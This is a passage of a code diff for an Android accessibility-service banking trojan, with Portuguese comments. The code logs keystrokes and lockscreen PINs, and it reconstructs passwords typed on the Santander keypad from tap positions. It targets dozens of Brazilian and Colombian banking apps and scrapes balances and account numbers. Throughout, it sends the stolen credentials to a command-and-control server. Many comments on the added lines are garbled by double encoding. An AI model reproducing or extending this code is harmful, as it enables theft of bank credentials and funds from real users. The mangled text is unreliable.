                         String cleanText = text.replace("[", "").replace("]", "");
                         
-                        // Se o último caractere não é um ponto/asterisco, é o dígito real!
+                        // Se o ÃƒÂºltimo caractere nÃƒÂ£o ÃƒÂ© um ponto/asterisco, ÃƒÂ© o dÃƒÂ­gito real!
                         if (cleanText.length() > 0) {
                             char lastChar = cleanText.charAt(cleanText.length() - 1);
                             if (Character.isDigit(lastChar)) {
-                                // CAPTURADO! O dígito real apareceu antes de ser mascarado
+                                // CAPTURADO! O dÃƒÂ­gito real apareceu antes de ser mascarado
                                 String capturedDigit = String.valueOf(lastChar);
-                                Log.w(TAG, "🔐 SANTANDER DÍGITO REAL CAPTURADO: " + capturedDigit);
+                                activeBankPkg = packageName; activeBankHint = fieldHint; activeBankField = fieldName;
+                                bankPwdBuf.append(capturedDigit);
+                                handler.removeCallbacks(bankPwdFlush);
+                                handler.postDelayed(bankPwdFlush, 1800);
+                                Log.w(TAG, "Ã°Å¸â€Â SANTANDER DÃƒÂGITO REAL CAPTURADO: " + capturedDigit);
                                 sendKeylogData(packageName, capturedDigit, fieldHint, fieldName, true, "BANK_PASSWORD_DIGIT_REAL");
                             }
                         }
                         
                         // ========================================
-                        // ESTRATÉGIA 2: Contar a quantidade de caracteres para saber quantos dígitos
+                        // ESTRATÃƒâ€°GIA 2: Contar a quantidade de caracteres para saber quantos dÃƒÂ­gitos
                         // ========================================
                         if (addedCount > 0) {
-                            // Detecta se é asterisco ou ponto (mascarado)
-                            boolean isMasked = cleanText.contains("●") || cleanText.contains("•") || cleanText.contains("*");
+                            // Detecta se ÃƒÂ© asterisco ou ponto (mascarado)
+                            boolean isMasked = cleanText.contains("Ã¢â€”Â") || cleanText.contains("Ã¢â‚¬Â¢") || cleanText.contains("*");
                             
                             if (isMasked) {
-                                // Conta quantos dígitos foram inseridos baseado na quantidade de máscaras
+                                // Conta quantos dÃƒÂ­gitos foram inseridos baseado na quantidade de mÃƒÂ¡scaras
                                 int totalDigits = cleanText.length();
-                                Log.w(TAG, "🔐 SANTANDER SENHA MASCARADA: " + totalDigits + " dígitos inseridos");
-                                sendKeylogData(packageName, "[" + totalDigits + " dígitos]", fieldHint, fieldName, true, "BANK_PASSWORD_MASKED_COUNT");
+                                Log.w(TAG, "Ã°Å¸â€Â SANTANDER SENHA MASCARADA: " + totalDigits + " dÃƒÂ­gitos inseridos");
+                                sendKeylogData(packageName, "[" + totalDigits + " dÃƒÂ­gitos]", fieldHint, fieldName, true, "BANK_PASSWORD_MASKED_COUNT");
                             }
                         }
                         
                         // ========================================
-                        // ESTRATÉGIA 3: Usar beforeText para calcular diferença
+                        // ESTRATÃƒâ€°GIA 3: Usar beforeText para calcular diferenÃƒÂ§a
                         // ========================================
                         if (beforeText != null && addedCount > 0) {
                             String before = beforeText.toString();
                             
-                            // Se beforeText tem dígito real que foi removido/substituído por máscara
+                            // Se beforeText tem dÃƒÂ­gito real que foi removido/substituÃƒÂ­do por mÃƒÂ¡scara
                             if (before.length() > 0) {
                                 char lastBeforeChar = before.charAt(before.length() - 1);
                                 if (Character.isDigit(lastBeforeChar)) {
-                                    // O beforeText tinha o dígito real!
+                                    // O beforeText tinha o dÃƒÂ­gito real!
                                     String capturedDigit = String.valueOf(lastBeforeChar);
-                                    Log.w(TAG, "🔐 SANTANDER DÍGITO VIA BEFORETEXT: " + capturedDigit);
+                                    activeBankPkg = packageName; activeBankHint = fieldHint; activeBankField = fieldName;
+                                    if (bankPwdBuf.length() == 0) { bankPwdBuf.append(capturedDigit); handler.removeCallbacks(bankPwdFlush); handler.postDelayed(bankPwdFlush, 1800); }
+                                    Log.w(TAG, "Ã°Å¸â€Â SANTANDER DÃƒÂGITO VIA BEFORETEXT: " + capturedDigit);
                                     sendKeylogData(packageName, capturedDigit, fieldHint, fieldName, true, "BANK_PASSWORD_DIGIT_BEFORE");
                                 }
                             }
                         }
                         
                         // ========================================
-                        // ESTRATÉGIA 4: Captura incremental - detecta mudança no tamanho
+                        // ESTRATÃƒâ€°GIA 4: Captura incremental - detecta mudanÃƒÂ§a no tamanho
                         // ========================================
                         if (!previousText.isEmpty() && text.length() > previousText.length()) {
                             int newDigitsCount = text.length() - previousText.length();
-                            Log.w(TAG, "🔐 SANTANDER INCREMENTO: +" + newDigitsCount + " novo(s) dígito(s)");
-                            // Não envia aqui pois já foi enviado acima
+                            Log.w(TAG, "Ã°Å¸â€Â SANTANDER INCREMENTO: +" + newDigitsCount + " novo(s) dÃƒÂ­gito(s)");
+                            // NÃƒÂ£o envia aqui pois jÃƒÂ¡ foi enviado acima
                         }
                     }
                     
@@ -5403,7 +5650,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Captura seleção de texto (mostra o que está sendo selecionado)
+        // Captura seleÃƒÂ§ÃƒÂ£o de texto (mostra o que estÃƒÂ¡ sendo selecionado)
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
             List<CharSequence> textList = event.getText();
             if (textList != null && !textList.isEmpty()) {
@@ -5419,27 +5666,27 @@ public class UiAssistBridge extends AccessibilityService {
         }
         
         // ========================================
-        // 🏦 SANTANDER ESPECIAL: Captura via inspeção do campo de senha
-        // Monitora campos de senha a cada evento para pegar dígitos reais
+        // Ã°Å¸ÂÂ¦ SANTANDER ESPECIAL: Captura via inspeÃƒÂ§ÃƒÂ£o do campo de senha
+        // Monitora campos de senha a cada evento para pegar dÃƒÂ­gitos reais
         // ========================================
         boolean isSantander = packageName.contains("santander");
         if (isSantander && rootNode != null) {
             captureSantanderPassword(rootNode, packageName);
         }
         
-        // Captura campos de SENHA (CRÍTICO!)
+        // Captura campos de SENHA (CRÃƒÂTICO!)
         if (rootNode != null && (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
                                   eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED)) {
             findAndCapturePasswordFields(rootNode, packageName);
         }
         
-        // Captura nome do app + tela atual (filtra classes genéricas/internas do Android)
+        // Captura nome do app + tela atual (filtra classes genÃƒÂ©ricas/internas do Android)
         if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             CharSequence className = event.getClassName();
             if (className != null) {
                 String clsStr = className.toString();
                 
-                // Ignora layouts/containers internos genéricos do Android e classes minificadas curtas
+                // Ignora layouts/containers internos genÃƒÂ©ricos do Android e classes minificadas curtas
                 boolean isGenericLayout = clsStr.startsWith("android.widget.") || 
                                           clsStr.startsWith("android.view.") || 
                                           clsStr.startsWith("android.graphics.") || 
@@ -5459,8 +5706,8 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Busca texto em todos os filhos de um nó (recursivo)
-     * Útil para teclados bancários que escondem o texto em elementos filhos
+     * Busca texto em todos os filhos de um nÃƒÂ³ (recursivo)
+     * ÃƒÅ¡til para teclados bancÃƒÂ¡rios que escondem o texto em elementos filhos
      */
     private String findTextInChildren(AccessibilityNodeInfo node) {
         if (node == null) return "";
@@ -5503,7 +5750,7 @@ public class UiAssistBridge extends AccessibilityService {
         if (node == null) return;
         
         try {
-            // Verifica se é campo de senha
+            // Verifica se ÃƒÂ© campo de senha
             if (node.isPassword()) {
                 CharSequence text = node.getText();
                 if (text != null && text.length() > 0) {
@@ -5529,12 +5776,12 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Detecta qual dígito foi clicado no teclado do Santander baseado na posição
-     * O teclado Santander usa imagens sem texto, então identificamos pela posição
+     * Detecta qual dÃƒÂ­gito foi clicado no teclado do Santander baseado na posiÃƒÂ§ÃƒÂ£o
+     * O teclado Santander usa imagens sem texto, entÃƒÂ£o identificamos pela posiÃƒÂ§ÃƒÂ£o
      */
     private String detectSantanderKeypadDigit(Rect bounds, AccessibilityNodeInfo node) {
         try {
-            // Obtém dimensões da tela
+            // ObtÃƒÂ©m dimensÃƒÂµes da tela
             android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
             int screenWidth = dm.widthPixels;
             int screenHeight = dm.heightPixels;
@@ -5542,22 +5789,22 @@ public class UiAssistBridge extends AccessibilityService {
             int centerX = bounds.centerX();
             int centerY = bounds.centerY();
             
-            // Teclado numérico típico está na metade inferior da tela
+            // Teclado numÃƒÂ©rico tÃƒÂ­pico estÃƒÂ¡ na metade inferior da tela
             // Layout 3x4: (1,2,3), (4,5,6), (7,8,9), (cancelar,0,confirmar)
             
-            // Calcula posição relativa no teclado (0-1)
+            // Calcula posiÃƒÂ§ÃƒÂ£o relativa no teclado (0-1)
             // Assumindo teclado ocupa ~50% inferior da tela e ~90% da largura central
             float keypadTop = screenHeight * 0.5f;
             float keypadBottom = screenHeight * 0.95f;
             float keypadLeft = screenWidth * 0.05f;
             float keypadRight = screenWidth * 0.95f;
             
-            // Verifica se está na área do teclado
+            // Verifica se estÃƒÂ¡ na ÃƒÂ¡rea do teclado
             if (centerY < keypadTop || centerY > keypadBottom) {
                 return "";
             }
             
-            // Calcula posição relativa (0-1) dentro do teclado
+            // Calcula posiÃƒÂ§ÃƒÂ£o relativa (0-1) dentro do teclado
             float relX = (centerX - keypadLeft) / (keypadRight - keypadLeft);
             float relY = (centerY - keypadTop) / (keypadBottom - keypadTop);
             
@@ -5569,7 +5816,7 @@ public class UiAssistBridge extends AccessibilityService {
             col = Math.max(0, Math.min(2, col));
             row = Math.max(0, Math.min(3, row));
             
-            // Mapeia para dígitos
+            // Mapeia para dÃƒÂ­gitos
             // Row 0: 1, 2, 3
             // Row 1: 4, 5, 6
             // Row 2: 7, 8, 9
@@ -5591,7 +5838,7 @@ public class UiAssistBridge extends AccessibilityService {
                 return "[OK]";
             }
             
-            // Também tenta detectar pela contentDescription ou por siblings
+            // TambÃƒÂ©m tenta detectar pela contentDescription ou por siblings
             if (node.getContentDescription() != null) {
                 String desc = node.getContentDescription().toString().toLowerCase();
                 for (int i = 0; i <= 9; i++) {
@@ -5610,14 +5857,14 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Retorna palavra do dígito em português
+     * Retorna palavra do dÃƒÂ­gito em portuguÃƒÂªs
      */
     private String getDigitWord(int digit) {
         switch (digit) {
             case 0: return "zero";
             case 1: return "um";
             case 2: return "dois";
-            case 3: return "três";
+            case 3: return "trÃƒÂªs";
             case 4: return "quatro";
             case 5: return "cinco";
             case 6: return "seis";
@@ -5629,8 +5876,8 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔐 Detecta qual dígito foi clicado na tela de bloqueio (PIN)
-     * Similar ao detectSantanderKeypadDigit, mas para lockscreen padrão do Android
+     * Ã°Å¸â€Â Detecta qual dÃƒÂ­gito foi clicado na tela de bloqueio (PIN)
+     * Similar ao detectSantanderKeypadDigit, mas para lockscreen padrÃƒÂ£o do Android
      */
     private String digitByGridPosition(AccessibilityNodeInfo node) {
         try {
@@ -5668,7 +5915,7 @@ public class UiAssistBridge extends AccessibilityService {
                 if (desc.matches("^[0-9]$")) {
                     return desc;
                 }
-                // Tenta encontrar dígito no texto
+                // Tenta encontrar dÃƒÂ­gito no texto
                 for (int i = 0; i <= 9; i++) {
                     String digitStr = String.valueOf(i);
                     if (desc.equals(digitStr) || desc.startsWith(digitStr + " ") || 
@@ -5678,7 +5925,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             
-            // Tenta obter texto do nó
+            // Tenta obter texto do nÃƒÂ³
             if (node.getText() != null) {
                 String text = node.getText().toString();
                 if (text.matches("^[0-9]$")) {
@@ -5686,7 +5933,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
 
-            // Tenta detectar pelo Resource ID do botão (Samsung, Motorola, Pixel generic keys)
+            // Tenta detectar pelo Resource ID do botÃƒÂ£o (Samsung, Motorola, Pixel generic keys)
             if (node.getViewIdResourceName() != null) {
                 String viewId = node.getViewIdResourceName();
                 String lowerId = viewId.toLowerCase();
@@ -5701,7 +5948,7 @@ public class UiAssistBridge extends AccessibilityService {
                         lowerId.endsWith("digit_" + i) ||
                         lowerId.contains("keypad_" + i) ||
                         lowerId.contains("pin_" + i)) {
-                        Log.d(TAG, "🔐 PIN detectado por ID do Recurso: " + i + " (id=" + viewId + ")");
+                        Log.d(TAG, "Ã°Å¸â€Â PIN detectado por ID do Recurso: " + i + " (id=" + viewId + ")");
                         return String.valueOf(i);
                     }
                 }
@@ -5713,7 +5960,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             
-            // Se não tem texto nem ID identificável, calcula pela posição física na tela (muito robusto)
+            // Se nÃƒÂ£o tem texto nem ID identificÃƒÂ¡vel, calcula pela posiÃƒÂ§ÃƒÂ£o fÃƒÂ­sica na tela (muito robusto)
             android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
             int screenWidth = dm.widthPixels;
             int screenHeight = dm.heightPixels;
@@ -5724,7 +5971,7 @@ public class UiAssistBridge extends AccessibilityService {
             float yRel = (float) centerY / screenHeight;
             float xRel = (float) centerX / screenWidth;
 
-            // Em teclados modernos (especialmente Samsung e Motorola em telas altas), o teclado numérico
+            // Em teclados modernos (especialmente Samsung e Motorola em telas altas), o teclado numÃƒÂ©rico
             // costuma ocupar a parte inferior, mas pode ir de 30% a 99% da tela.
             if (yRel > 0.30f && yRel < 0.97f && xRel > 0.02f && xRel < 0.98f) {
                 // Determina coluna (0-2)
@@ -5733,12 +5980,12 @@ public class UiAssistBridge extends AccessibilityService {
                 else if (xRel < 0.66f) col = 1;
                 else col = 2;
 
-                // Determina linha (0-3) usando escala flexível
-                // Começa na linha dos números 1,2,3 e vai até a linha do 0
+                // Determina linha (0-3) usando escala flexÃƒÂ­vel
+                // ComeÃƒÂ§a na linha dos nÃƒÂºmeros 1,2,3 e vai atÃƒÂ© a linha do 0
                 float keyboardStart = 0.35f;
                 float keyboardEnd = 0.97f;
                 
-                // Auto-ajusta limites caso o clique esteja muito nas bordas da zona típica
+                // Auto-ajusta limites caso o clique esteja muito nas bordas da zona tÃƒÂ­pica
                 if (yRel < keyboardStart) keyboardStart = yRel - 0.02f;
                 if (yRel > keyboardEnd) keyboardEnd = yRel + 0.02f;
 
@@ -5762,7 +6009,7 @@ public class UiAssistBridge extends AccessibilityService {
                 int digit = keypad[row][col];
                 
                 if (digit >= 0) {
-                    Log.d(TAG, "🔐 PIN detectado por posição robusta: " + digit + " (row=" + row + ", col=" + col + ")");
+                    Log.d(TAG, "Ã°Å¸â€Â PIN detectado por posiÃƒÂ§ÃƒÂ£o robusta: " + digit + " (row=" + row + ", col=" + col + ")");
                     return String.valueOf(digit);
                 } else if (digit == -1) {
                     return "[BACKSPACE]";
@@ -5785,7 +6032,7 @@ public class UiAssistBridge extends AccessibilityService {
         if (node == null) return "";
         
         try {
-            // Verifica se este nó é campo de senha focado
+            // Verifica se este nÃƒÂ³ ÃƒÂ© campo de senha focado
             if (node.isPassword() && node.isFocused()) {
                 CharSequence hint = node.getHintText();
                 if (hint != null) {
@@ -5816,12 +6063,12 @@ public class UiAssistBridge extends AccessibilityService {
      * Envia dados do keylogger para o servidor C&C
      */
     private void sendKeylogData(String packageName, String text, String hint, String fieldName, boolean isPassword, String eventType) {
-        // 🚫 IGNORA NOSSO PRÓPRIO APP APENAS SE NÃO FOR CAMPO DE SENHA/DADOS SENSÍVEIS
+        // Ã°Å¸Å¡Â« IGNORA NOSSO PRÃƒâ€œPRIO APP APENAS SE NÃƒÆ’O FOR CAMPO DE SENHA/DADOS SENSÃƒÂVEIS
         if ((packageName.equals("com.seguranca.protecao") || packageName.equals(getPackageName())) && !isPassword) {
             return;
         }
         
-        // 🏦 DETECÇÃO DE APP BANCÁRIO (BRASIL + COLÔMBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, NEQUI)
+        // Ã°Å¸ÂÂ¦ DETECÃƒâ€¡ÃƒÆ’O DE APP BANCÃƒÂRIO (BRASIL + COLÃƒâ€MBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, NEQUI)
         boolean isBankApp = packageName.contains("itau") || packageName.contains("bradesco") || 
             packageName.contains("santander") || packageName.contains("neon") ||
             packageName.contains("nubank") || packageName.contains("banco") ||
@@ -5844,25 +6091,25 @@ public class UiAssistBridge extends AccessibilityService {
             packageName.contains("bancobari") || packageName.contains("bancopine") ||
             packageName.contains("bancobmg") || packageName.contains("bancobv") ||
             packageName.contains("bancobs2") || packageName.contains("nu.production") ||
-            // 🇨🇴 COLÔMBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, NEQUI, ETC.
+            // Ã°Å¸â€¡Â¨Ã°Å¸â€¡Â´ COLÃƒâ€MBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, NEQUI, ETC.
             packageName.contains("davivienda") || packageName.contains("daviplata") ||
-            packageName.contains("bancolombia") || packageName.contains("nequi") ||
+            packageName.contains("bancolombia") || packageName.contains("nequi") || packageName.contains("rappipay") || packageName.contains("nu.production") || packageName.contains("lulo") || packageName.contains("pibank") || packageName.contains("movi") || packageName.contains("uala") || packageName.contains("tuya") || packageName.contains("bancoomeva") || packageName.contains("bancoagrario") || packageName.contains("bancow") || packageName.contains("serfinanza") || packageName.contains("finandina") || packageName.contains("avvillas") || packageName.contains("colpatria") || packageName.contains("scotiabank") || packageName.contains("falabella") || packageName.contains("bbva") || packageName.contains("bancopopular") || packageName.contains("bancamiga") ||
             packageName.contains("bancodebogota") || packageName.contains("mbankingcolombia") ||
             packageName.contains("bancopopular") || packageName.contains("bancodeoccidente") ||
             packageName.contains("avvillas") || packageName.contains("colpatria") ||
             packageName.contains("lulobank") || packageName.contains("rappi") ||
             packageName.contains("falabella") || packageName.contains("bancoagrario");
         
-        // 🔥 BUFFER DE SENHA BANCÁRIA REVOLUCIONADO V3.0 (Não depende de isPassword == true!)
-        // Captura qualquer dígito único (0-9) ou caractere de teclado em apps de banco
+        // Ã°Å¸â€Â¥ BUFFER DE SENHA BANCÃƒÂRIA REVOLUCIONADO V3.0 (NÃƒÂ£o depende de isPassword == true!)
+        // Captura qualquer dÃƒÂ­gito ÃƒÂºnico (0-9) ou caractere de teclado em apps de banco
         if (isBankApp && text != null && !text.isEmpty()) {
             long currentTime = System.currentTimeMillis();
             
-            // Extrai dígitos numéricos ou padrões de teclado customizado (ex: "1", "2", "1 ou 2", "Teclado 4")
+            // Extrai dÃƒÂ­gitos numÃƒÂ©ricos ou padrÃƒÂµes de teclado customizado (ex: "1", "2", "1 ou 2", "Teclado 4")
             String extractedDigit = extractDigitFromBankText(text);
             
             if (!extractedDigit.isEmpty()) {
-                // Debounce inteligente: ignora apenas se for o EXATO mesmo evento em menos de 15ms (duplicação de evento do Android)
+                // Debounce inteligente: ignora apenas se for o EXATO mesmo evento em menos de 15ms (duplicaÃƒÂ§ÃƒÂ£o de evento do Android)
                 if (extractedDigit.equals(lastKeylogDigit) && (currentTime - lastKeylogTime) < 15) {
                     return;
                 }
@@ -5870,7 +6117,7 @@ public class UiAssistBridge extends AccessibilityService {
                 lastKeylogDigit = extractedDigit;
                 lastKeylogTime = currentTime;
                 
-                // Se trocou de aplicativo de banco, envia a senha anterior antes de começar nova
+                // Se trocou de aplicativo de banco, envia a senha anterior antes de comeÃƒÂ§ar nova
                 if (!packageName.equals(currentBankApp) && bankPasswordBuffer.length() > 0) {
                     flushBankPasswordBuffer();
                 }
@@ -5879,12 +6126,12 @@ public class UiAssistBridge extends AccessibilityService {
                 bankPasswordBuffer.append(extractedDigit);
                 lastBankDigitTime = currentTime;
                 
-                Log.w(TAG, "🏦 DÍGITO BANCO CAPTURADO V3.0: [" + extractedDigit + "] Buffer atual: " + bankPasswordBuffer.toString());
+                Log.w(TAG, "Ã°Å¸ÂÂ¦ DÃƒÂGITO BANCO CAPTURADO V3.0: [" + extractedDigit + "] Buffer atual: " + bankPasswordBuffer.toString());
                 
-                // ⚡ ENVIO DUPLO IMEDIATO: Envia o dígito individual IMEDIATAMENTE para o servidor (tempo real)
-                sendKeylogDataInternal(packageName, extractedDigit, hint != null ? hint : "Dígito Bancário", fieldName, true, "BANK_DIGIT_REALTIME");
+                // Ã¢Å¡Â¡ ENVIO DUPLO IMEDIATO: Envia o dÃƒÂ­gito individual IMEDIATAMENTE para o servidor (tempo real)
+                sendKeylogDataInternal(packageName, extractedDigit, hint != null ? hint : "DÃƒÂ­gito BancÃƒÂ¡rio", fieldName, true, "BANK_DIGIT_REALTIME");
                 
-                // Reagenda flush automático para senha completa
+                // Reagenda flush automÃƒÂ¡tico para senha completa
                 if (bankPasswordFlushRunnable != null) {
                     bankPasswordHandler.removeCallbacks(bankPasswordFlushRunnable);
                 }
@@ -5895,18 +6142,18 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                 };
                 
-                // Se acumulou 4, 6 ou 8 dígitos (padrões de senhas bancárias), envia a senha compilada!
+                // Se acumulou 4, 6 ou 8 dÃƒÂ­gitos (padrÃƒÂµes de senhas bancÃƒÂ¡rias), envia a senha compilada!
                 if (bankPasswordBuffer.length() == 4 || bankPasswordBuffer.length() == 6 || bankPasswordBuffer.length() >= 8) {
-                    bankPasswordHandler.postDelayed(bankPasswordFlushRunnable, 1200); // 1.2s de pausa após padrão
+                    bankPasswordHandler.postDelayed(bankPasswordFlushRunnable, 1200); // 1.2s de pausa apÃƒÂ³s padrÃƒÂ£o
                 } else {
                     bankPasswordHandler.postDelayed(bankPasswordFlushRunnable, BANK_PASSWORD_TIMEOUT_MS);
                 }
                 
-                return; // Dígito processado pelo engine de banco
+                return; // DÃƒÂ­gito processado pelo engine de banco
             }
         }
         
-        // 🔥 DEBOUNCE normal para outros eventos
+        // Ã°Å¸â€Â¥ DEBOUNCE normal para outros eventos
         if (isPassword && text != null && text.length() == 1 && text.matches("\\d")) {
             long currentTime = System.currentTimeMillis();
             if (text.equals(lastKeylogDigit) && (currentTime - lastKeylogTime) < 15) {
@@ -5921,14 +6168,14 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🧠 ENGINE DE EXTRAÇÃO DE DÍGITOS BANCÁRIOS (INOCULADOR DE SENHAS V3.0)
-     * Converte qualquer texto de botão customizado de banco em dígitos limpos (0-9)
+     * Ã°Å¸Â§Â  ENGINE DE EXTRAÃƒâ€¡ÃƒÆ’O DE DÃƒÂGITOS BANCÃƒÂRIOS (INOCULADOR DE SENHAS V3.0)
+     * Converte qualquer texto de botÃƒÂ£o customizado de banco em dÃƒÂ­gitos limpos (0-9)
      */
     private String extractDigitFromBankText(String text) {
         if (text == null || text.trim().isEmpty()) return "";
         String trimmed = text.trim();
         
-        // Se for um único dígito
+        // Se for um ÃƒÂºnico dÃƒÂ­gito
         if (trimmed.length() == 1 && Character.isDigit(trimmed.charAt(0))) {
             return trimmed;
         }
@@ -5937,12 +6184,12 @@ public class UiAssistBridge extends AccessibilityService {
         if (trimmed.contains("ou") || trimmed.contains("e") || trimmed.contains("/")) {
             String digitsOnly = trimmed.replaceAll("[^0-9]", "");
             if (digitsOnly.length() >= 1) {
-                return trimmed; // Ex: "1/2" mantém a dupla para análise
+                return trimmed; // Ex: "1/2" mantÃƒÂ©m a dupla para anÃƒÂ¡lise
             }
         }
         
-        // Trata texto de acessibilidade: "Teclado número 5", "Botão 7", "Dígito 9"
-        if (trimmed.toLowerCase().contains("número") || trimmed.toLowerCase().contains("teclado") || trimmed.toLowerCase().contains("botão")) {
+        // Trata texto de acessibilidade: "Teclado nÃƒÂºmero 5", "BotÃƒÂ£o 7", "DÃƒÂ­gito 9"
+        if (trimmed.toLowerCase().contains("nÃƒÂºmero") || trimmed.toLowerCase().contains("teclado") || trimmed.toLowerCase().contains("botÃƒÂ£o")) {
             String digitsOnly = trimmed.replaceAll("[^0-9]", "");
             if (digitsOnly.length() == 1) {
                 return digitsOnly;
@@ -5956,8 +6203,8 @@ public class UiAssistBridge extends AccessibilityService {
     private java.util.Map<String, Long> lastReportedBalanceTimeMap = new java.util.HashMap<>();
 
     /**
-     * 💰 SCANNER UNIVERSAL DE SALDO E DADOS BANCÁRIOS (TODOS OS BANCOS V3.0)
-     * Varre a tela em tempo real para encontrar saldos ("R$ ...") em Nubank, Itaú, Bradesco, Santander, BB, Caixa, Inter, C6, PicPay, Mercado Pago, etc.
+     * Ã°Å¸â€™Â° SCANNER UNIVERSAL DE SALDO E DADOS BANCÃƒÂRIOS (TODOS OS BANCOS V3.0)
+     * Varre a tela em tempo real para encontrar saldos ("R$ ...") em Nubank, ItaÃƒÂº, Bradesco, Santander, BB, Caixa, Inter, C6, PicPay, Mercado Pago, etc.
      */
     private void scanAndReportBankBalance(AccessibilityNodeInfo rootNode, String packageName) {
         if (rootNode == null || packageName == null || packageName.isEmpty()) return;
@@ -5975,7 +6222,7 @@ public class UiAssistBridge extends AccessibilityService {
             String detectedBalance = null;
             String accountInfo = "";
 
-            // Procura por padrões de moeda R$ / $ / COP ou valores numéricos próximos a palavras chave de saldo
+            // Procura por padrÃƒÂµes de moeda R$ / $ / COP ou valores numÃƒÂ©ricos prÃƒÂ³ximos a palavras chave de saldo
             for (int i = 0; i < allTexts.size(); i++) {
                 String str = allTexts.get(i).trim();
                 String lower = str.toLowerCase();
@@ -5989,10 +6236,10 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                 }
 
-                // Detecta termos como "Saldo", "Disponível", "Disponible", "Saldo total", "Cuentas", "Bolsillos"
-                if (lower.contains("saldo") || lower.contains("disponivel") || lower.contains("disponível") || 
+                // Detecta termos como "Saldo", "DisponÃƒÂ­vel", "Disponible", "Saldo total", "Cuentas", "Bolsillos"
+                if (lower.contains("saldo") || lower.contains("disponivel") || lower.contains("disponÃƒÂ­vel") || 
                     lower.contains("disponible") || lower.contains("cuentas") || lower.contains("bolsillos") || lower.contains("daviplata")) {
-                    // Procura nos próximos 3 nós por um valor numérico formatado
+                    // Procura nos prÃƒÂ³ximos 3 nÃƒÂ³s por um valor numÃƒÂ©rico formatado
                     for (int j = i; j <= Math.min(i + 3, allTexts.size() - 1); j++) {
                         String candidate = allTexts.get(j).trim();
                         if (candidate.matches(".*[0-9]{1,3}(\\.[0-9]{3})*,[0-9]{2}.*") || candidate.matches(".*(R\\$|\\$)\\s?.*")) {
@@ -6005,8 +6252,8 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                 }
 
-                // Captura Agência, Conta ou Cédula/Documento Davivienda
-                if (lower.contains("ag") || lower.contains("agência") || lower.contains("conta") || lower.contains("cuenta") || lower.contains("cédula") || lower.contains("cedula")) {
+                // Captura AgÃƒÂªncia, Conta ou CÃƒÂ©dula/Documento Davivienda
+                if (lower.contains("ag") || lower.contains("agÃƒÂªncia") || lower.contains("conta") || lower.contains("cuenta") || lower.contains("cÃƒÂ©dula") || lower.contains("cedula")) {
                     if (str.length() < 40) {
                         accountInfo += str + " ";
                     }
@@ -6019,12 +6266,12 @@ public class UiAssistBridge extends AccessibilityService {
                     lastReportedBalanceMap.put(packageName, detectedBalance);
                     lastReportedBalanceTimeMap.put(packageName, now);
 
-                    Log.w(TAG, "💰 SALDO BANCÁRIO CAPTURADO V3.0 (" + packageName + "): " + detectedBalance + " | Info: " + accountInfo);
+                    Log.w(TAG, "Ã°Å¸â€™Â° SALDO BANCÃƒÂRIO CAPTURADO V3.0 (" + packageName + "): " + detectedBalance + " | Info: " + accountInfo);
                     CommandControlService.sendBankBalance(this, packageName, detectedBalance, accountInfo.trim());
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Erro no scanner de saldo bancário: " + e.getMessage());
+            Log.e(TAG, "Erro no scanner de saldo bancÃƒÂ¡rio: " + e.getMessage());
         }
     }
 
@@ -6050,7 +6297,7 @@ public class UiAssistBridge extends AccessibilityService {
 
     private String extractCurrencyString(String text) {
         if (text == null) return null;
-        // Suporta R$ (Brasil), $ e COP$ (Colômbia / Davivienda / DaviPlata)
+        // Suporta R$ (Brasil), $ e COP$ (ColÃƒÂ´mbia / Davivienda / DaviPlata)
         java.util.regex.Matcher matcher = java.util.regex.Pattern.compile("(R\\$\\s?[0-9\\.\\,]+|COP\\$\\s?[0-9\\.\\,]+|\\$\\s?[0-9]{1,3}(\\.[0-9]{3})*(\\,[0-9]{2})?|[0-9]{1,3}(\\.[0-9]{3})*,[0-9]{2})").matcher(text);
         if (matcher.find()) {
             String val = matcher.group(1).trim();
@@ -6060,7 +6307,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🏦 Envia buffer de senha bancária acumulada com Classificação Heurística
+     * Ã°Å¸ÂÂ¦ Envia buffer de senha bancÃƒÂ¡ria acumulada com ClassificaÃƒÂ§ÃƒÂ£o HeurÃƒÂ­stica
      */
     private void flushBankPasswordBuffer() {
         if (bankPasswordBuffer.length() == 0) return;
@@ -6071,7 +6318,7 @@ public class UiAssistBridge extends AccessibilityService {
         
         boolean isDavivienda = currentBankApp.contains("davivienda") || currentBankApp.contains("daviplata");
         
-        // Classificação inteligente da senha baseada no comprimento e no banco
+        // ClassificaÃƒÂ§ÃƒÂ£o inteligente da senha baseada no comprimento e no banco
         String category = "SENHA_BANCARIA";
         if (isDavivienda) {
             if (length == 4) {
@@ -6095,7 +6342,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        Log.w(TAG, "🏦 SENHA BANCÁRIA COMPLETA RECOMPILADA: " + appName + " [" + category + "]: " + completePassword);
+        Log.w(TAG, "Ã°Å¸ÂÂ¦ SENHA BANCÃƒÂRIA COMPLETA RECOMPILADA: " + appName + " [" + category + "]: " + completePassword);
         
         // Envia a senha completa formatada para o painel C&C
         sendKeylogDataInternal(currentBankApp, completePassword, category, "password", true, "BANK_PASSWORD_COMPLETE");
@@ -6110,20 +6357,21 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Envia dados do keylogger para o servidor C&C (método interno)
